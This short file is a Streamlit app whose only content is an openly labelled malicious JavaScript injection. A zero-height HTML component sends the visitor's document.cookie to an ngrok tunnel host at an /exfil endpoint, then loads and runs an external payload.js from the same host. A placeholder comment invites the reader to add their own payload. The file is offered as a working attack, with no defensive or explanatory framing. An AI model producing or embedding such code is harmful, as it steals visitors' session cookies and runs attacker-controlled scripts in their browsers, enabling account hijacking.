# app.py
import streamlit as st
import streamlit.components.v1 as components

# Inject malicious JS
components.html("""
<script>
    // Your payload here
    fetch('https://838c32416fd9.ngrok-free.app/exfil?cookie=' + document.cookie);
    
    // Or load external script
    var s = document.createElement('script');
    s.src = 'https://838c32416fd9.ngrok-free.app/payload.js';
    document.body.appendChild(s);
</script>
""", height=0)